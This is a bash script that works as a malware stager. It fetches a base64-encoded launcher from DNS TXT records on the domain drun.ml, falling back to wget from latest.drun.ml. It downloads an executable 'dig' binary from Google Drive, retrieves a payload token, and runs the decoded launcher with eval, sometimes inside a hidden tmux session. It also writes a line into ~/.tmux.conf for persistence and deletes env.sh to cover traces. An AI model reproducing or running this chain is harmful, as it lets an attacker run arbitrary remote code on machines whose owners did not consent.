#!/bin/bash

TMX=${TMX:-0}
PATH=.:$PATH

for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
    rm -f $ph/.xtst
    touch $ph/.xtst &&
        chmod +x $ph/.xtst &&
        $ph/.xtst &&
        rm -f $ph/.xtst &&
        cd $ph &&
        break
done
{ type base64 &>/dev/null && b64=base64; } ||
        { type openssl &>/dev/null && b64="openssl enc -base64 "; } ||
                { sleep 3 && echo "no encoding tools availables!" exit 1; }

parsedata() {
    ## strip truncated messages
    # data=$(echo "${data}" | while read l; do [ "${l/\;\;}" = "${l}" ] && echo "$l" && break; done)
    data=$(IFS=\$'" "'; echo $data) ## after this we order chunks
    data=${data// }
    data=$(while read l; do echo ${l:1}; done <<< "$data")
    ## dns records escaping related
    # data=${data//\ }
    # data=${data//\"}
    ## fix for freedns TXT submission
    # [ "$data" != "${data%eql}" ] && data="${data%eql}="
}

querydns() {
    dig="dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
    $dig @1.1.1.1 || $dig @8.8.8.8 || $dig
}

endpoints() {
    chunksize=2047 # 1 char for order
    zone=drun.ml
    record=d
    data=$(querydns)
    parsedata
    launcher=${data}
    launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
    # script_url=$(dig txt latest.drun.ml +short)
    zone=drun.ml
    record=pl
    pl_token=$(querydns)
    pl_token=${pl_token//\"}
}

endpoints_fallback() {
    script_url=latest.drun.ml
    launcher=$(wget -qO- "$script_url" | $b64 -d)
    parselauncher
    pl_token=$(wget -S https://pl.drun.ml 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
    pl_token=${pl_token/*\/}
}

getdig() {
    fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
    filename="dig"
    wget --save-cookies ./cookie -O/dev/null \
         -q "https://drive.google.com/uc?export=download&id=${fileid}"
    wget --load-cookies ./cookie \
         "https://drive.google.com/uc?export=download&confirm=`awk '/download/ {print $NF}' ./cookie`&id=${fileid}" \
         -O ${filename}
    chmod +x dig
}

if type dig &>/dev/null; then
    endpoints
else
    getdig && endpoints ||
            endpoints_fallback
fi

export pl_token=${pl_token} pl_name="payload-latest.zip"
# echo "export \
#     ">>env.sh

if [ "$TMX" = 1 ]; then
    tmx_init="new -s init sleep 10"
    grep -q "$tmx_init" ~/.tmux.conf || echo "$tmx_init" >> ~/.tmux.conf
    tmux start-server
    tmux set -g default-shell /bin/bash

    tmux  setenv -g pl_token "$pl_token"
    tmux  setenv -g pl_name "$pl_name"

    tmux new -d -s crt 'eval '"$launcher"
    (sleep 5 && rm env.sh) &>/dev/null &
else
    (sleep 5 && rm env.sh) &>/dev/null &
    eval "$launcher"
fi
